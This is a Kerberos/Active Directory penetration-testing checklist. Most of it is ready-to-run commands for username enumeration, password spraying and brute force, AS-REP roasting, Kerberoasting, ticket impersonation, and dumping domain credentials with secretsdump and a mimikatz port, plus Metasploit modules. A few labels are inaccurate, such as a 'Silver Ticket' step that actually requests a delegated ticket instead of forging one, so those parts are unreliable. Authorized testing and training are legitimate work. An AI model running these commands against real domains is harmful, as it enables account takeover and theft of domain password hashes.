# Kerberos Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Kerberos (port 88), I realistically expect to find:

- [ ] Valid domain usernames via Kerberos protocol responses
- [ ] Accounts vulnerable to AS-REP Roasting (no pre-auth)
- [ ] Service accounts with SPNs vulnerable to Kerberoasting
- [ ] Weak credentials through password spraying/brute-force
- [ ] Service ticket extraction for offline cracking
- [ ] Ability to impersonate users via Silver Ticket attacks
- [ ] Dump of domain hashes using credentials or tickets
- [ ] Domain user/group enumeration via LDAP

---

## ‚úÖ Kerberos Pentest Checklist

- [ ] **Nmap Enumeration**
  - Discover valid usernames using NSE script.
    ```
    nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1
    ```

- [ ] **Kerbrute - Username Enumeration**
  - Enumerate valid users without authentication.
    ```
    kerbrute userenum -d test.local usernames.txt
    ```

- [ ] **Kerbrute - Password Spray**
  - Test a single password against many users.
    ```
    kerbrute passwordspray -d test.local domain_users.txt password123
    ```

- [ ] **Kerbrute - Bruteforce One User**
  - Attempt multiple passwords against a single user.
    ```
    kerbrute bruteuser -d test.local passwords.txt john
    ```

- [ ] **AS-REP Roasting (No Pre-Auth Accounts)**
  - Extract crackable hashes from users without pre-auth.
    ```
    python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
    ```

- [ ] **Kerberoasting (SPNs)**
  - Dump service tickets to crack offline.
    ```
    python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
    ```
  - Targeted approach:
    ```
    python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1
    ```

- [ ] **Silver Ticket Attack**
  - Forge a ticket for lateral movement or persistence.
    ```
    python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
    ```

- [ ] **Domain User Enumeration**
  - Dump all users with credentials.
    ```
    python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
    ```

- [ ] **Dump Credentials - secretsdump.py**
  - Remote dump using valid credentials.
    ```
    python3 secretsdump.py test.local/john:password123@10.10.10.1
    ```
  - Offline NTDS dump:
    ```
    python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
    ```

- [ ] **Mimikatz (Remote Execution via Python Port)**
  - Extract passwords and hashes if available.
    ```
    python3 mimikatz.py test.local/john:password123@10.10.10.1
    ```

---

## ‚úÖ Metasploit Modules

- **AS-REP Roasting**
    ```
    use auxiliary/analyze/kerberos/kerberos_asrep_roast
    ```

- **Kerberos SPN Enumeration**
    ```
    use auxiliary/gather/kerberos_enumusers
    ```
